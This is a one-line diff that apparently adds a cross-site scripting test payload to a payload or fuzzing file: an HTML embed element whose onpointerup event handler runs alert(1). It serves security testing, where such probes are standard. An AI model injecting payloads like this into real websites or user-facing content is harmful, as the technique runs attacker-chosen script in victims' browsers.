@@ -1,0 +1,1 @@
+<embed onpointerup=alert(1)>XSS</embed>
